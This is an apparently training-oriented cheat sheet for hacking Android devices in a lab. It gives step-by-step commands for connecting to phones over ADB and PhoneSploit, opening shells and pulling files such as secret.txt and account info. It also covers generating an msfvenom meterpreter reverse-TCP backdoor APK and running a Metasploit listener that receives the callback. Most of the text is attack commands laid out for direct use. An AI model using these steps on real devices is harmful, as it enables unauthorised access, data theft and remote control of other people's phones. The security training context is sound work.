# 17 - Hacking Mobile

#### <mark style="color:blue;">**Module 17 - Hacking Mobile Platforms**</mark>

### Download a file from Android using ADB Tool

```bash
adb devices -l

# Connection Establish Steps
adb connect 192.168.0.4:5555
adb devices -l
adb shell  

# Download a File from Android using ADB tool
adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
adb pull sdcard/log.txt /home/mmurphy/Desktop
```

### Download a file from Android using PhoneSploit

```bash
git clone https://github.com/aerosol-can/PhoneSploit
cd PhoneSploit
pip3 install colorama
#OR
python3 -m pip install colorama

python3 phonesploit.py

# Type 3 and Press Enter to Connect a new Phone OR Enter IP of Android Device
# Type 4, to Access Shell on phone

pwd
ls
cd sdcard
ls
cd Download

#Download File using PhoneSploit
9. Pull Folders from Phone to PC

#Enter the Full Path of file to Download
sdcard/Download/secret.txt
```

### Check entropy and hash of elf file using ADB Tool

<pre class="language-bash"><code class="lang-bash">#Perform deep scan of the elf files and obtain the last 4 digits of SHA 384 hash of the file with highest entropy value
<strong>
</strong><strong>adb connect 192.168.0.4:5555 # Connection Establish Steps
</strong>adb shell  

#1. check elf file with highest entropy
ls sdcard/scan #check if there're .elf files
sudo adb pull /sdcard/scan #download entire dir including .elf files
ent -h #ent tool options, if we haven't it: apt install ent
ent first_file.elf #Entropy value 3.28412 bits, it has highest value of entropy.
ent second_file.elf #Entropy value 1.15679 bits

#2. check the last 4 digits of SHA 384
sha384sum --help
sha384sum first_file.elf
#select only the last 4 digits of hash.
</code></pre>

## Generating and Executing Payloads for Android

#### Setup Android

* Open terminal, run `su`
* Run `ip addr add 10.10.10.69/24 dev eth0`

#### Generate Payload&#x20;

* `msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.10.11 R > Desktop/Backdoor.apk` R raw
* Host the payload and run a listener on Kali
* Type `use exploit/multi/handler`
* Type `set payload android/meterpreter/reverse_tcp`
* Type `set LHOST 10.10.10.11`
* Start listener, type `exploit -j -z`
* Browse link of file to start meterpreter session.

#### Exploit Execution

* Open kali hosted link.
* Download APK using es file downloader.
* Install and run.

### **Exploit the Android Platform through ADB using PhoneSploit**

* cd Phonesploit
* python3 -m pip install colorama
* python3 phonesploit.py
* 3
* 10.10.10.14
* 4
* pwd
* cd sdcard
* cd Download
* pwd
* cd sdcard
* cd downloads
* cat accnt-info.txt&#x20;
